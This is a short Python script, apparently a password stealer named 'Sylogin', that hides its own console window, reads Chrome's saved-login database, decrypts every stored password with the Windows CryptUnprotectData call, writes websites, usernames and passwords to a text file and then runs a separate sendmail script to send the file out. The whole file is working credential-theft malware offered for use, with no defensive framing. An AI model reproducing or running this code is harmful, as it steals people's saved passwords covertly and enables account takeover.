#!/usr/bin/env python
'''
  ___      _           _
 / __|_  _| |___  __ _(_)_ _
 \__ \ || | / _ \/ _` | | ' \
 |___/\_, |_\___/\__, |_|_||_|
      |__/       |___/
                                v1.2
                                by: luisxciv

'''

from os import getenv
import sqlite3
import win32crypt
import os

#If we want to hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#Lets Connect to the Database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
cursor = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to wait the other transaction to finish,
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(r"Chromepass.txt", "a+")

# we write to the file
fp.write("Chrome Saved Passwords\n")
for result in cursor.fetchall():

    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]

    if password:

        fp.write('\nWebsite: '+result[0])
        fp.write('\nUsername: '+result[1])
        fp.write('\nPassword: ' + str(password))


    ## lets send the file now, rune the sendmail script

os.system('python sendmail.py')
